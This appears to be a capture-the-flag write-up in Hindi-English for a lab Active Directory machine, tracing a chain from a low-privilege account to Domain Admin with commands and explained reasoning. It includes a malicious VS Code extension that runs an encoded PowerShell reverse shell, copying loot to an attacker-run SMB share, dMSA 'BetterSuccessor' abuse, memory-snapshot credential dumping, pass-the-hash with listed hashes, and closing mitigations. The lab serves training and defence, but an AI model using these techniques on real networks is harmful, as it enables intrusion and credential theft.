Checkpoint — Full Attack Walkthrough

Assumed-breach low-priv account se Domain Admin tak — har step ka command, output, screenshot aur reasoning ke saath.
Machine
Checkpoint
Difficulty
Medium
OS
Windows Server 2025 (AD)
Author
AnuragTaparia

📜 Synopsis

Checkpoint ek medium-difficulty Windows Active Directory machine hai jo ek corporate environment ko model karti hai. Engagement ek assumed-breach position se start hota hai — ek low-privileged domain account jiski sabse khaas permission hai: AD Recycle Bin (Deleted Objects container) par write access.

Deleted Objects ko enumerate karne par ek deleted contractor account milta hai jise reanimate (restore) kiya ja sakta hai. Us restored account par password reuse ka fayda uthakar ek SMB share tak write access milta hai jo VS Code extensions ke liye drop-zone ka kaam karta hai. Wahan ek malicious extension plant karne se, jab ek scheduled task use install karta hai, ek domain user ke context mein shell mil jaati hai — ye ek classic supply chain compromise hai.

Uske baad, ek OU par CreateChild aur ek service account par GenericWrite permissions ka combination BetterSuccessor technique ko enable karta hai — ye Delegated Managed Service Accounts (dMSA) ke post-patch abuse ka tareeka hai, jisme ek forged succession se ek dMSA bana ke us account ki privileges carry karne wala Kerberos ticket mil jaata hai. Aage ki enumeration se ek backup share milta hai jisme ek decommissioned server ka VMware memory snapshot hai — us snapshot ko analyze karke Administrator ka NT hash recover hota hai, jo pure domain mein reused nikalta hai aur Pass-the-Hash se Domain Admin access de deta hai.

🧠 Skills Required

  • Windows Fundamentals
  • Windows & Active Directory Fundamentals
  • Kerberos Authentication
  • SMB Enumeration

🎓 Skills Learned

  • AD Recycle Bin abuse karke tombstoned objects ko reanimate karna
  • Visual Studio Code Extension ko weaponize karna (supply-chain attack)
  • dMSA Privilege Escalation via BetterSuccessor
  • VMware memory snapshots se credential extraction

🔻 Enumeration → Exploitation → Privilege Escalation

1Valid Creds Confirm Karna + Kerberos Config Taiyaar Karna

Humein assumed-breach scenario mein pehle se ek low-privileged domain account diya gaya hai: alex.turner : Checkpoint2024!. Sabse pehle check karte hain ki ye credential kaam kar rahi hai ya nahi, aur saath hi ek Kerberos config file (checkpoint.krb5) bhi generate kar lete hain, kyunki aage jaake humein Kerberos-based authentication (jaise -k flag wale tools) use karni padegi.
nxc smb 10.129.156.193 -u alex.turner -p 'Checkpoint2024!' --generate-krb5-file checkpoint.krb5

cat checkpoint.krb5

export KRB5_CONFIG=checkpoint.krb5
POC Screenshot — Step 1
nxc se login confirm hua (DC01, domain checkpoint.htb) aur Kerberos realm config file generate hui.
🎯 Ye attack / step kyun chuna gaya
Kyun ye step zaroori hai: Kerberos tickets (jo hum baad mein BetterSuccessor attack ke liye use karenge) sirf tab kaam karte hain jab system ko pata ho ki KDC (Domain Controller) kaunsa hai aur realm kya hai. Agar ye config file pehle se na banayein to baad mein Rubeus/bloodyAD jaise tools Kerberos authentication resolve hi nahi kar payenge. Ye ek choti si setup step hai jo poore attack chain ko possible banati hai.

2Writable AD Objects Dhundhna (DACL Enumeration)

Ab dekhte hain ki alex.turner account directory mein kya-kya modify kar sakta hai. bloodyAD ka get writable command poore domain ko scan karke batata hai ki kaunse objects par humare account ko WRITE ya CREATE_CHILD jaisi permissions mili hui hain.
bloodyAD -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --host 10.129.154.167 get writable
POC Screenshot — Step 2
Output mein highlighted entry: CN=Mark Davies (Deleted Objects container ke andar) par WRITE permission mil rahi hai, aur Deleted Objects container par DACL: WRITE bhi mil raha hai.
🎯 Ye attack / step kyun chuna gaya
Yahi wo turning point hai jahan se attack path decide hota hai. Normal AD objects par write access milna common hai, lekin yahan interesting baat ye hai ki ek deleted user object (Mark Davies) par bhi write permission mil rahi hai — jo AD ke "Deleted Objects" (Recycle Bin) container ke andar padi hai. Ye seedha signal hai ki AD Recycle Bin abuse karna possible hai, isliye humne is path ko select kiya — kyunki baaki writable entries (jaise DNS zones par CREATE_CHILD) sirf naye DNS records banane dete hain, jisse koi direct privilege escalation nahi milta. Deleted object par write access sabse directly exploitable cheez thi.

3Deleted Objects Container Enumerate Karna

Deleted objects normal LDAP search mein nazar nahi aate — unhe dekhne ke liye special LDAP control (1.2.840.113556.1.4.417 – Show Deleted Objects, aur 1.2.840.113556.1.4.2065) use karna padta hai. Hum saare deleted objects list karte hain taaki confirm ho sake ki mark.davies wahan maujood hai.
bloodyAD --host 10.129.154.167 -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get search \
  -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)' \
  --attr name,objectSid,sAMAccountName
POC Screenshot — Step 3
Saare deleted objects (tombstoned) list ho gaye — list ke aakhir mein Mark Davies ka deleted entry bhi dikh raha hai.
🎯 Ye attack / step kyun chuna gaya
Ye sirf confirmation step hai — isse pata chalta hai ki 'Mark Davies' sach mein Recycle Bin mein hai aur uska object abhi bhi "alive" hai (tombstone lifetime expire nahi hua), matlab use restore (reanimate) kiya ja sakta hai.

4Mark Davies Ko Restore (Reanimate) Karna

Ab jab confirm ho gaya ki humare paas us deleted object par WRITE access hai, hum use restore kar sakte hain. bloodyAD ka set restore command isDeleted flag clear karke object ko wapas OU=Employees ke andar le aata hai — bilkul wahi jagah jahan se wo delete hua tha.
bloodyAD --host 10.129.156.193 -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore \
  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

# Confirm karne ke liye domain users list karte hain
nxc smb 10.129.156.193 -u alex.turner -p 'Checkpoint2024!' --users
POC Screenshot — Step 4
'CN=Mark Davies ... has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' — aur user list mein mark.davies ab wapas dikh raha hai with its original last-password-set date.
🎯 Ye attack / step kyun chuna gaya
Restore karna kyun best option tha? Deleted account ka password change nahi hota jab wo restore hota hai — wahi purana password wapas kaam karta hai jo deletion ke time tha. Isliye ye ek bahut hi reliable privilege path hai bajaye kisi aur user ko bruteforce/guess karne ke. Ek baar restore hone ke baad hum seedha us account ki purani (potentially reused) password try kar sakte hain.

5Password Reuse Check + DevDrop Share Par Write Access

Chunki Mark Davies ka purana password humein nahi pata, hum pehle wahi password try karte hain jo alex.turner ka tha (Checkpoint2024!) — kyunki corporate environments mein password reuse kaafi common hota hai. Fir uske shares enumerate karte hain.
nxc smb 10.129.156.193 -u mark.davies -p 'Checkpoint2024!' --shares
POC Screenshot — Step 5
Login successful! Aur ab DevDrop share par READ,WRITE permission mil rahi hai — jiska comment khud bata raha hai: 'VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0'.
🎯 Ye attack / step kyun chuna gaya
Ye wahi moment hai jahan Recycle Bin abuse ka fayda milta hai. alex.turner ke paas sirf READ tha is share par, lekin mark.davies ke paas WRITE bhi hai. Ye share ek "supply chain" drop-zone hai — jo bhi .vsix file yahan daalenge, wo kisi aur machine/user dwara install ho sakti hai. Isliye humne is user ko restore karne ka rasta select kiya: kyunki alternative paths (jaise DNS zone CREATE_CHILD) hume kisi executable code-run tak nahi le jaate, jabki ye path seedha RCE (remote code execution) tak le jaata hai.

6Malicious VS Code Extension Banana — package.json

VS Code extension ek simple Node.js package hota hai jisme do zaroori files hoti hain: package.json (manifest — extension ka naam, version aur kab activate ho, ye batata hai) aur extension.js (actual code jo run hoga). Sabse pehle manifest banate hain.
cat > package.json << 'EOF'
{
  "name": "vscode-helper",
  "displayName": "VSCode Helper",
  "description": "Helper utility",
  "version": "1.0.0",
  "publisher": "helper-dev",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["onStartupFinished"],
  "main": "./extension.js"
}
EOF
POC Screenshot — Step 6
package.json file ready — dono files (extension.js aur package.json) ek hi 'extension' folder ke andar honi chahiye.
🎯 Ye attack / step kyun chuna gaya
'onStartupFinished' activation event hi sabse important trick hai. Is event ka matlab hai: VS Code khulte hi, bina kisi file open kiye, bina kisi command chalaye, extension apna code automatically chala dega. Victim ko kuch bhi click karne ki zaroorat nahi — bas editor open hona chahiye. Engine version bhi exactly ^1.118.0 rakha gaya hai, kyunki share ke description mein yahi version compatibility maangi gayi thi — agar version mismatch hota to VS Code extension install hi reject kar deta.

7Payload Likhna — extension.js (Reverse Shell)

Ab asli payload likhte hain jo activate() function ke andar run hoga. Ye ek PowerShell reverse-shell command ko base64-encoded form mein execute karta hai (-e flag se), taaki quoting/escaping ki dikkat na ho aur AV detection thoda mushkil ho.
const { exec } = require('child_process');

function activate(context) {
    exec('powershell -e <BASE64_ENCODED_REVERSE_SHELL_COMMAND>');
}

function deactivate() {}

module.exports = { activate, deactivate };
POC Screenshot — Step 7
extension.js file — jaise hi VS Code load hoga, encoded PowerShell command background mein execute ho jayega aur attacker machine se connect-back karega.
🎯 Ye attack / step kyun chuna gaya
Encoded PowerShell command kyun? Normal exec() call mein agar hum directly ek complex reverse-shell one-liner (jisme quotes, pipes, special characters hote hain) daalte, to JS string escaping mushkil ho jaati aur command corrupt ho sakta tha. Base64 encoding (-EncodedCommand) is poore issue ko solve karta hai — poora payload ek hi clean base64 blob ban jaata hai jo bina kisi escaping problem ke pass ho jaata hai.

8Extension Ko Package Karna (.vsix banana)

Code ready hai, ab ise ek installable .vsix archive mein pack karna hai. Official Microsoft tool vsce (Visual Studio Code Extension manager) isi ke liye banaya gaya hai.
# vsce install (agar already nahi hai):
sudo npm install -g @vscode/vsce

# Package banao:
vsce package --allow-missing-repository --no-dependencies
POC Screenshot — Step 8
vsce ne LICENSE/README jaisi missing cheezon pe sirf warning di, lekin fir bhi successfully 'vscode-helper-1.0.0.vsix' (4 files, 2.11 KB) bana diya.
🎯 Ye attack / step kyun chuna gaya
vsce hi use karne ki wajah ye hai ki ye Microsoft ka official packaging tool hai, isliye generate hui .vsix file ka structure ([Content_Types].xml, extension.vsixmanifest, extension/ folder) bilkul wahi hoga jo asli VS Code marketplace extensions ka hota hai — manually ZIP banane mein format galat hone ka risk rehta, jisse installer file ko reject bhi kar sakta tha.

9Vsix Ko Share Par Daalna + Reverse Shell Catch Karna

Ab payload taiyaar hai. Use karte hain mark.davies ki WRITE permission se DevDrop share par upload karna, aur ek Netcat listener khol ke wait karte hain.
# Listener (dusri terminal mein):
nc -lvnp 443

# Upload:
smbclient //10.129.154.167/DevDrop -U mark.davies
smb: \> put vscode-helper-1.0.0.vsix
POC Screenshot — Step 9
File upload ho gayi. Thodi der baad — ek scheduled task (jo periodically DevDrop ko scan/install karta hai) ne extension install kar diya, aur hamein ek shell mil gayi: 'checkpoint\ryan.brooks' as C:\Program Files\Microsoft VS Code user.
🎯 Ye attack / step kyun chuna gaya
Yahi asli 'supply chain attack' hai. Humne kisi bhi machine ko directly attack nahi kiya — balki us drop-zone mein malicious package chhod diya jahan se koi automated/human process use pick karke install kar dega. Ye technique isliye select ki kyunki hamare paas us machine par koi direct RCE nahi tha; lekin jo bhi process us share se extensions install karta hai, wo humari taraf se code execute kar dega — attacker ko khud exploit develop karne ki bhi zaroorat nahi padi, sirf 'trust' ka galat istemal kiya gaya (classic supply-chain pattern, jaise SolarWinds jaise real-world incidents mein hota hai).

10User Flag

Shell mil chuki hai ryan.brooks ke context mein. Desktop check karte hain user flag ke liye.
cd Desktop
dir
type user.txt
POC Screenshot — Step 10
user.txt file mil gayi — foothold confirmed as ryan.brooks.

11SharpHound Se AD Enumeration

Ab lateral movement ke liye hume pata karna hai ki ryan.brooks ke paas kya-kya permissions hain domain mein. SharpHound poore domain ka graph bana ke BloodHound mein analyze karne layak data collect karta hai.
.\SharpHound.exe -c All
POC Screenshot — Step 11
SharpHound ne ACL, Groups, Sessions, Trusts, Containers jaisi cheezein collect ki aur ek .zip file bana di.
🎯 Ye attack / step kyun chuna gaya
Manual enumeration (jaise PowerShell/Get-Acl) ke bajaye SharpHound kyun? SharpHound ek hi shot mein poore domain ka relationship graph bana deta hai — kaun kis par kya permission rakhta hai, kaun si group membership hai, sab kuch. BloodHound mein ise visually analyze karke privilege escalation paths turant dikh jaate hain, jabki manually har object check karna bahut slow hota.

12Loot Ko Kali Machine Par Exfiltrate Karna

Collected BloodHound data ko apni attack machine par laane ke liye ek temporary SMB server start karte hain aur target se file copy karte hain.
# Kali par:
impacket-smbserver share . -smb2support

# Target (Windows) par:
copy 20261025112356_BloodHound.zip \\10.10.16.72\share\
POC Screenshot — Step 12
File successfully Kali machine par transfer ho gayi, ab BloodHound GUI mein import karke analyze kar sakte hain.
🎯 Ye attack / step kyun chuna gaya
Target machine par heavy analysis tools chalana risky/slow hota hai, isliye raw data ko apni machine par le aana behtar approach hai — fast analysis, aur target par kam se kam footprint (fewer logs/artifacts).

13DMSAHolder OU Par Permissions Confirm Karna

BloodHound/manual analysis se pata chala ki ek interesting OU hai: OU=DMSAHolder. Uski ACL directly dsacls se bhi check kar sakte hain.
dsacls "OU=DMSAHolder,DC=checkpoint,DC=htb"
POC Screenshot — Step 13
Access list mein dikh raha hai: 'Allow CHECKPOINT\ryan.brooks — SPECIAL ACCESS — CREATE CHILD'.
🎯 Ye attack / step kyun chuna gaya
CREATE_CHILD on an OU named 'DMSAHolder' ek bahut bada hint hai. dMSA (delegated Managed Service Account) Windows Server 2025 ka naya service-account type hai jo legacy account migration ke liye design hua hai. Jab bhi aisi naming/permission milti hai, ye seedha dMSA abuse (BadSuccessor/BetterSuccessor) attack ki taraf point karta hai — jo humne is box mein select kiya, kyunki ye sabse directly exploitable aur latest (2025) technique thi jo yahan fit baith rahi thi. Dusra option, jaise kerberoasting ya ACL abuse kisi normal group par, yahan available hi nahi tha.

14Ryan.brooks Ke Liye Fake-Delegation TGT Lena (Rubeus tgtdeleg)

BetterSuccessor attack ke liye hume Kerberos tickets ke saath kaam karna hai. Humare paas ryan.brooks ka password nahi hai (sirf reverse-shell session hai), isliye Rubeus tgtdeleg use karke Kerberos GSS-API delegation trick se current session ka ek usable TGT nikaalte hain — bina password diye.
.\Rubeus.exe tgtdeleg
POC Screenshot — Step 14
Fake delegation TGT mil gaya — base64 encoded ticket.kirbi output mein dikh raha hai.
🎯 Ye attack / step kyun chuna gaya
Ticket nikal kar kyun use karte hain, password crack karne ke bajaye? Password cracking slow, unreliable aur loud (failed logon attempts = alerts) hota hai. tgtdeleg Kerberos ke andar ek legitimate delegation mechanism ka istemaal karta hai jo current logged-in session ke liye silently ek TGT de deta hai — ye bahut tez aur stealthy approach hai.

15Ticket Ko Save Karke Kali Par Laana

Ticket base64 string ko ek file mein save karte hain taaki use Kali machine par convert kiya ja sake.
mousepad ryan.brooks.kirbi.b64
cat ryan.brooks.kirbi.b64
POC Screenshot — Step 15
Base64 ticket blob file mein save ho gaya.

16Ticket Ko .kirbi se .ccache Mein Convert Karna

Linux/Impacket tools Windows ke .kirbi format nahi, balki .ccache format samajhte hain. Isliye convert karte hain aur environment variable set karte hain taaki saare Kerberos tools isi ticket ko use karein.
base64 -d ryan.brooks.kirbi.b64 > ryan.brooks.kirbi
impacket-ticketConverter ryan.brooks.kirbi ryan.brooks.ccache
export KRB5CCNAME=ryan.brooks.ccache
POC Screenshot — Step 16
Conversion successful — ab is ccache file se Kerberos authentication possible hai, bina password ke.
🎯 Ye attack / step kyun chuna gaya
Ye sirf ek format-conversion/plumbing step hai, lekin bahut zaroori hai — bina isske koi bhi Linux-based tool (bloodyAD, impacket, etc.) us ticket ko use hi nahi kar payega.

17Permissions Ko Kerberos Auth Se Dobara Confirm Karna

Clock skew errors se bachne ke liye pehle apni machine ka time Domain Controller se sync karte hain, fir ryan.brooks ke ccache ticket (-k flag) se authenticate karke uski group membership aur writable objects dobara verify karte hain.
sudo ntpdate -u 10.129.156.193

bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.156.193 -d checkpoint.htb -k get membership mark.davies

bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.156.193 -d checkpoint.htb -k get writable
POC Screenshot — Step 17
Confirm: OU=DMSAHolder par CREATE_CHILD, aur CN=svc_deploy (ServiceAccounts) par bhi WRITE permission mil rahi hai!
🎯 Ye attack / step kyun chuna gaya
Ye second permission (GenericWrite/WRITE on svc_deploy) hi puzzle ka doosra tukda hai. BetterSuccessor attack (post-patch dMSA abuse) kaam karne ke liye do cheezein chahiye: (1) kisi OU par CREATE_CHILD — taaki naya dMSA bana sakein, aur (2) target account (jisko hum impersonate karna chahte hain) par GenericWrite — taaki us account ka SupersededManagedAccountLink attribute khud edit kar sakein (kyunki Microsoft ke August-2025 patch ke baad KDC dono taraf ka link match karta hai — forward link dMSA se, aur reverse link predecessor account se). Humare paas dono permissions maujood hain, isliye ye exact attack chosen kiya gaya — simple BadSuccessor (sirf CreateChild) ab patched system par kaam nahi karta, isliye 'Better'Successor (dono taraf ka link set karna) zaroori ban gaya.

18BetterSuccessor Attack Execute Karna (dMSA Create + Impersonate)

Ab asli exploit chalate hain. bloodyAD ka add badSuccessor module ek hi command mein naya dMSA banata hai OU=DMSAHolder ke andar, uska msDS-ManagedAccountPrecededByLink svc_deploy ki taraf point karta hai, AUR (patch bypass karne ke liye) svc_deploy ka reverse link (msDS-SupersededManagedAccountLink) bhi khud set kar deta hai — fir seedha ek Kerberos ticket maang leta hai jo svc_deploy ki privileges carry karta hai.
bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.156.193 -d checkpoint.htb -u ryan.brooks -k \
  add badSuccessor fmsa_shubham --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'
POC Screenshot — Step 18
'Creating DMSA fmsa_shubham$ in OU=DMSAHolder...' aur 'Impersonating: CN=svc_deploy,OU=ServiceAccounts...' — fir seedha ek encoded Kerberos ticket (EncodedKirbi) return hota hai, UserName: fmsa_shubham$ ke naam se, lekin svc_deploy ki privileges ke saath.
🎯 Ye attack / step kyun chuna gaya
Yahi is poore box ka sabse 'core' aur sabse recent (patch-aware) attack hai. Pehle, BadSuccessor (2025 ke shuru mein discovered) mein sirf ek-taraf link set karke koi bhi arbitrary privileged account impersonate kiya ja sakta tha — bina us account par kisi permission ke bhi. Microsoft ne patch karke ye check add kar diya ki link dono taraf se match ho. Lekin patch ye nahi check karta ki reverse link kisne set kiya — sirf ye check karta hai ki wo exist karta hai ya nahi. Isliye agar attacker ke paas target account (svc_deploy) par GenericWrite bhi ho (jaisa humare case mein hai), to wo khud hi reverse link bana ke validation pass kara sakta hai. Isiliye is attack ko humne select kiya — ye exactly wahi gap target karta hai jo patched environment mein bhi khula reh gaya, jabki purana BadSuccessor yahan kaam nahi karta (kyunki KDC validation fail ho jaati).

19Previous-Key (RC4) Extract Karke svc_deploy Ban Jaana

dMSA ka Kerberos ticket (TGS) request karte waqt KDC uske andar sirf current account ki keys hi nahi, balki superseded (purane) account ki keys bhi embed kar deta hai — iska matlab humein seedha svc_deploy ka RC4 (NTLM) hash mil jaata hai, ticket ke andar se hi, bina kisi cracking ke! Fir us hash se directly login karte hain.
# (ticket process se mila) dMSA previous keys:
# RC4: e16081eb077aca74dbdbf8af12af43ac9

nxc smb 10.129.156.193 -u svc_deploy -H e16081eb077aca74dbdbf8af12af43ac9

evil-winrm -i 10.129.156.193 -u svc_deploy -H e16081eb077aca74dbdbf8af12af43ac9
POC Screenshot — Step 19
nxc se hash valid confirm hui, aur Evil-WinRM se seedha shell mil gayi: 'checkpoint\svc_deploy'.
🎯 Ye attack / step kyun chuna gaya
Hash seedha ticket se nikalna kyun behtar hai bruteforce/cracking se? dMSA ke design ka hi ek part hai ki wo migration ke doraan purani credentials carry kare — attacker ke liye ye ek free, instant, 100%-reliable credential-dump mechanism ban jaata hai, bina kisi password-guessing ya offline-cracking ke zaroorat ke. Pass-the-Hash se login karna bhi password ki zaroorat ko bypass kar deta hai.

20VM Memory Snapshot Se Administrator Hash Nikalna

svc_deploy ke paas ek backup share (VMBackups) tak access hai, jisme ek decommissioned server ka VMware snapshot (.vmem + .vmsn) pada hai. Jab VM running state mein snapshot liya jaata hai, uski poori RAM (LSASS process samet) disk par freeze ho jaati hai. vmkatz (ek Mimikatz-jaisa tool, jo renamed hai AV/EDR detection se bachne ke liye — 'vm'+'katz') is snapshot file ko parse karke credentials nikal leta hai, bilkul waise hi jaise Mimikatz live LSASS memory se nikalta hai.
cd "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics"
& "C:\Users\svc_deploy\Documents\vmkatz.exe" "Windows Server 2019-Snapshot1.vmem"
POC Screenshot — Step 20
vmkatz ne SAM Hashes extract kiye — highlighted: Administrator → NT:f29e9c014295b9b32139b09a2790be3b, saath hi LSA Secrets aur DPAPI keys bhi mil gaye.
🎯 Ye attack / step kyun chuna gaya
Live-system credential-dumping tools (jaise normal Mimikatz) is snapshot par kaam nahi karte kyunki ye ek static file hai, live process nahi. Isliye specialised tool vmkatz select kiya gaya jo .vmem/.vmsn files ko hi "fake live memory" ki tarah treat karke parse kar sakta hai. Ye bhi dikhata hai ki modern EDR/PPL/Credential-Guard protections yahan bekaar hain — kyunki OS se koi permission maangi hi nahi ja rahi, sirf ek file read ho rahi hai jo hypervisor ne already banayi thi.

21Domain Admin — Pass-the-Hash

Corporate environments mein aksar build-images/admin passwords reuse hote hain. Yahi pattern humne alex.turner → mark.davies aur phir dMSA-ticket mein bhi dekha, isliye is decommissioned server ke local Administrator hash ko Domain Controller ke Administrator account ke against try karte hain.
nxc smb 10.129.156.193 -u Administrator -H f29e9c014295b9b32139b09a2790be3b

evil-winrm -i 10.129.156.193 -u Administrator -H f29e9c014295b9b32139b09a2790be3b

type C:\Users\Administrator\Desktop\root.txt
🎯 Ye attack / step kyun chuna gaya
Ye hash Domain Controller ke Administrator (jo Domain Admins group mein hai) ke saath bhi reused nikla — '(Pwn3d!)' confirm hota hai nxc mein. Is step ka screenshot is batch mein shamil nahi tha, lekin ye poore writeup ki official story (aur humare collected hash ki validity) se directly confirm hota hai: Pass-the-Hash se humein full Domain Admin access mil jaata hai aur root flag retrieve ho jaata hai.

🎯 Overall — Ye poora attack-path hi kyun select kiya gaya (aur doosre kyun nahi)

Is machine par alag-alag jagah par multiple writable/misconfigured permissions diye gaye the. Humne har decision point par sabse direct aur reliable raasta choose kiya, aur yahan bataya gaya hai ki kyun:

  • AD Recycle Bin abuse (restore) vs. password guessing: Humare paas directly ek deleted-object par write access tha. Restore karna 100% deterministic hai — password guess karna unreliable aur loud hota.
  • VS Code supply-chain attack vs. direct exploit: DC/target machine par koi direct vulnerable service nahi mil raha tha jisse RCE milta. Lekin ek share specifically VS Code extensions ke liye bana hua tha — ye ek "trust abuse" primitive tha jo seedha code-execution deta hai, bina kisi CVE/exploit-dev ke.
  • BetterSuccessor (post-patch dMSA abuse) vs. plain BadSuccessor: Environment already Microsoft ka August-2025 patch (mutual-link validation) laga chuka tha, isliye purana BadSuccessor (sirf ek-taraf link) kaam nahi karta. Humare paas dono zaroori permissions (CreateChild + GenericWrite) maujood thay, isliye BetterSuccessor hi iss environment ke liye sahi aur working technique thi.
  • VM Snapshot credential dump vs. live LSASS dump: Target live system par PPL/Credential Guard jaisi protections active ho sakti thi, lekin ek offline VM snapshot file in protections se bilkul bypass ho jaati hai — isliye vmkatz jaisa specialised tool select kiya gaya jo specifically memory-snapshot files parse karta hai.
  • Pass-the-Hash vs. password cracking: NTLM hash mil chuka tha, aur reused password pattern already dikh chuka tha (alex.turner → mark.davies). PtH NTLM authentication ke design ka hi hissa hai — hash hi kaafi hai, plaintext password nikaalne ki zaroorat nahi.

Har step previous step ka direct result tha — ek chain jahan ek chhoti si misconfiguration (read access + deleted-object-write) dheere-dheere Domain Admin tak le gayi.

🛡️ Mitigations

  • AD Recycle Bin deleted objects par bhi WRITE/WriteDacl permissions sirf trusted admin groups tak limit karo.
  • Password reuse rokne ke liye alag-alag accounts (especially restored/legacy) ke liye unique passwords enforce karo.
  • Kisi bhi "drop share" (jaise extension/package repositories) par sirf signed/reviewed packages hi install hone dein, aur anonymous/low-priv WRITE access hata do.
  • dMSA deployment mein OU-level CreateChild aur target-account-level GenericWrite dono ko strictly least-privilege rakho — sirf dedicated migration admins ko hi ye rights do.
  • VM snapshots jo live-memory capture karte hain, unhe encrypted backups mein store karo aur access strictly service-specific accounts tak limit karo.
  • Local Administrator passwords ko LAPS jaisi solution se unique/randomized rakho, taaki ek compromised legacy server poore domain ko impact na kare.
